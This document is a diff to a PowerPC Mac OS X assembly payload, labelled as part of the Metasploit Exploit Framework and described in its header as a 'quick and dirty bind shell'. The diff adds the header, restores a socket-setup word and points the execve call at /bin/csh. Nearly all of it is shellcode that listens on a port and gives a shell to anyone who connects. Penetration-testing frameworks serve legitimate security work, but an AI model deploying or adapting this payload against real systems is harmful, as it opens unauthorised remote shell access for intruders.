@@ -1,4 +1,23 @@
-; osx_bind.s
+;;
+;
+;        Name: osx_bind
+;   Qualities: Can Have Nulls
+;   Platforms: MacOS X / PPC
+;     Authors: H D Moore <hdm [at] metasploit.com>
+;     Version: $Revision$
+;     License:
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Quick and dirty bind shell
+;
+;
+;;
+
 
 .globl _main
 .globl _execsh
@@ -17,7 +36,7 @@ _socket:
 
 	bl _bind
 	.long 0x00022312
-;	.long 0x00000000
+	.long 0x00000000
 
 _bind:	
 	mflr	r4
@@ -68,9 +87,13 @@ _execsh:
 	bnel	_execsh
 	mflr	r3
 	addi	r3, r3, 28	; distance to path
-	stw	r3, -8(r1)	; argv[0] = path
-	stw	r5, -4(r1)	; argv[1] = NULL
+	stw	r3, -8(r1)		; argv[0] = path
+	stw	r5, -4(r1)		; argv[1] = NULL
 	subi	r4, r1, 8	; r4 = {path, 0}
 	li	r0, 59
-	sc			; execve(path, argv, NULL)
-path:   .asciz "/bin/csh"
+	sc					; execve(path, argv, NULL)
+	
+; csh removes the need for setuid()
+path:
+	.ascii	"/bin/csh"
+	.long 	0x00414243
